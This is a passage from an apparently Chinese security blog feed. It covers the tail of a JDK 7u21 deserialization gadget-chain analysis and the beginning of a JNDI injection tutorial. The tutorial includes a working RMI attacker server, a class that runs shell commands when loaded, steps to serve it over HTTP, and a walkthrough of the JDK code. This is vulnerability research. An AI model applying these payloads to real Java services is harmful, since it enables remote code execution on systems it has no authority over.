ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line">    ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">    Object o = objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="this-memberValues的键值对的值先占位"><a href="#this-memberValues的键值对的值先占位" class="headerlink" title="this.memberValues的键值对的值先占位"></a>this.memberValues的键值对的值先占位</h4><p>以上代码还会有最后一个疑问，为啥我们填入this.memberValues的map要先试用override字符串来占位，直接填入恶意的攻击类templates不行么？</p><p>确实是不行的，因为我们可以看到我们在生成LinkedHashSet时调用了<code>java.util.HashSet#add</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了我们触发漏洞的函数map.put(),同时也是按照我们的漏洞触发顺序去调用map.put，这会导致payload会在我们本地触发，之后会无法序列化成功(至于为啥序列化不成功不想追究了！)</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9w99brtj321119ok7c.jpg" alt="直接templates.png"></p><p>所以一套完美的利用链就分析完了！</p><h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>我们在7u80版本中去查看AnnotationInvocationHandler的构造方法，会发现对于this.type进行了校验必须为Annotation.class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们们使用以上的payload去打7u80版本的jdk就会在反序列化AnnotationInvocationHandler类调用其构造函数的时候，报错。</p><blockquote><p>这也就是为什么之前的payload说到在高版本创建需要使用反射把恶意的this.type写进去，当然构造时可以这样，触发时就必须走构造函数，骚操作不了了。</p></blockquote><p>主要组件的 LinkedHashSet -&gt; AnnotationInvocationHandler -&gt; templateImpl 就因为AnnotationInvocationHandler 反序列化失败而失败。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一路分析下来，只能说这个利用链实在是太骚了。</p><p>从templates.newTransformer触发链的限制条件，使用javassist去构造templates恶意类。（其中分析了_tfactory与版本问题，payload位置static与构造函数的问题）</p><p>再通过java的动态代理特性，选中了AnnotationInvocationHandler这个拦截器。</p><p>我们通过AnnotationInvocationHandler的invoke拦截实现类的特性，选择了this.type特殊构造了AnnotationInvocationHandler类。链接了 proxy.equals(templates)到Templates.newTransformer()。</p><p>再是通过LinkedHashSet类，左打通了序列化与反序列化的入口点，右在反序列化恢复集合的过程中存在着一处a.equals(b)可以连接proxy.equals(templates)这一触发点。</p><p>最神奇的是为了满足到达触发点的要求，还反过头来利用AnnotationInvocationHandler类中的invoke方法中的hashCode路径。在AnnotationInvocationHandler构造中寻求了一处特殊的this.memberValues，来达成hash(a)=hash(b)的骚操作。</p><p>只可以说安全研究员真是大佬….这个穿针引线一处不差的。</p><p>虽然说这条利用链已经被封了好久了，但是我们也可以意识到被封杀的是AnnotationInvocationHandler构造方法处。</p><p>如果可以通过其他途径接上templates.newTransformer，就可以构筑一条新的链。因为单单templates.newTransformer是仍然可以作为payload执行的触发点的（比如7u80）。</p><h2 id="2019-12-12更新"><a href="#2019-12-12更新" class="headerlink" title="2019.12.12更新"></a>2019.12.12更新</h2><p>在看fastjsonexploit框架时，发现有Templates恶意类竟然有第二个触发点。前文中我们讲到的TemplatesImpl类是jdk自带的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>包中的类</p><p>看了fastjsonexploit的代码后，发现在另外一个包里面有一个跟我们上面TemplatesImpl几乎完全一样的一个类。</p><p>我们在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的父类Templates中查找继承该父类的类。（idea下ctrl+alt+B）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9tyydiep2j31bc0h8wgc.jpg" alt="1212-另一个包.png"></p><p>可以发现在<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>也继承该接口。该类与之前的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl几乎完全一致，payload也没有任何差别。只是在构造exp触发那个自定义类时，继承父类<code>AbstractTranslet</code>接口不一样（<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>），但是如果我们是在代码中动态指定父类的话，这也无关痛痒。</p><p>在github的代码中查找继承Templates类是无法找到该类的。</p><p>因为这个类是位于xalan这个第三方包里面，而不是在jdk7本身的代码中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可见这个触发点的利用链利用条件就更加苛刻了(jdk7u21+xalan2.7.2)。</p><p>不过单独就最后的这个触发点拎出来，也是一个新的思路，这样就把对于jdk7版本的限制变成了即使是jdk8的环境下，只要使用了xalan 2.7.2这个包，也会引入一个触发点。也算是扩大了攻击面吧。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/175754.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175754.html</a></p><p><a href="https://b1ue.cn/archives/176.html" target="_blank" rel="noopener">https://b1ue.cn/archives/176.html</a></p><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">https://gist.github.com/frohoff/24af7913611f8406eaf3</a></p><p><a href="https://sec.xiaomi.com/article/41" target="_blank" rel="noopener">https://sec.xiaomi.com/article/41</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">javassist使用全解析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JDK反序列化Gadgets-7u21&quot;&gt;&lt;a href=&quot;#JDK反序列化Gadgets-7u21&quot; class=&quot;headerlink&quot; title=&quot;JDK反序列化Gadgets 7u21&quot;&gt;&lt;/a&gt;JDK反序列化Gadgets 7u21&lt;/h2&gt;&lt;p&gt;预计
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入</title>
    <link href="http://lalajun.com/2019/10/23/JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://lalajun.com/2019/10/23/JNDI注入/</id>
    <published>2019-10-23T07:05:28.000Z</published>
    <updated>2020-07-06T05:08:01.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；<br>使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端<br>对于导致JNDI注入的漏洞代码扩展至com.sun.rowset.JdbcRowSetImpl函数，为fastjson反序列化起一个引子，准备新起一文。<br>分析了java版本变化对于JNDI注入的影响<br>引出了1.8u191之后的版本该如何利用JNDI注入，准备新起一文。<br>提到了LDAP-JNDI注入</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。<br>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。<br>代码格式如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line">Context context = <span class="keyword">new</span> InitialContext();<span class="comment">//初始化默认环境</span></span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure></p><p>这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着重讲解RMI，提到LDAP）</p><p>RMI格式:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">DataSource var2 = (DataSource)var1.lookup(<span class="string">"rmi://127.0.0.1:1099/Exploit"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>所谓的JNDI注入就是当上文代码中jndiName这个变量可控时，引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行。</p><p>我们看一个利用RMI的POC，忘记从哪里收集的了。然后分析一下调用的流程。</p><h3 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h3><p>ClIENT.java（受害者）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>SERVER.java(攻击者部署)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ExecTest.java(攻击者部署)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">"whoami"</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译成class文件：<code>javac ExecTest.java</code><br>部署在web服务上：<code>py -3 -m http.server 8081</code></p><p>运行SERVER<br>运行CLIENT</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8978mkmhyj31ir1btgt8.jpg" alt="POC成功.png"></p><blockquote><p>把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。<br>ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。<br>java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8979dgfh9j31ys0bt0uc.jpg" alt="1.8u211_失败.png"></p><h3 id="分析调用流程"><a href="#分析调用流程" class="headerlink" title="分析调用流程"></a>分析调用流程</h3><p>整体调用栈如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g8979n598cj30vr08nq3k.jpg" alt="调用栈.png"></p><p><code>InitialContext.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">    <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>GenericURLContext.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1="rmi://127.0.0.1:1099/aa"</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897a0gnsnj31h608idh5.jpg" alt="分支getRootURLContext.png"></p><p><code>RegistryContext.java</code>：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入var1=aa</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897a8b25uj31pw125n2b.jpg" alt="客户端与注册中心通讯-返回RMI服务接口.png"></p><p><code>RegistryContext.java</code>：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897afb8g2j32830w8jyx.jpg" alt="世界线变动-非reference.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897akpycbj31p51200x9.jpg" alt="世界线变动-reference.png"></p><p><code>NamingManager.java</code> 截取部分有用的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入Reference对象到refinfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                        Hashtable&lt;?,?&gt; environment)</span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>NamingManager.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 